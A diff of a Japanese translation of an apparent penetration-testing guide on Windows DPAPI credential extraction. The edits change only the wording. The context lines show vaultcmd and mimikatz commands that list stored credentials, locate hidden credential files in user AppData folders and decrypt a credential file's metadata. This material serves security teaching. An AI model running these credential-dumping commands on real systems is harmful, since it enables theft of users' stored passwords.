@@ -26,16 +26,16 @@ vaultcmd /listcreds:"Windows Credentials" /all
 # From mimikatz
 mimikatz vault::list
 ```
-## 認証ファイル
+## Credential Files
 
-**保護された認証ファイル**は、次の場所にあります:
+**保護された資格情報ファイル**は、次の場所にあります:
 ```
 dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-mimikatz `dpapi::cred`を使用して資格情報情報を取得すると、暗号化されたデータやguidMasterKeyなどの興味深い情報を見つけることができます。
+mimikatz `dpapi::cred`を使用して資格情報情報を取得すると、暗号化データやguidMasterKeyなどの興味深い情報を見つけることができます。
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
 
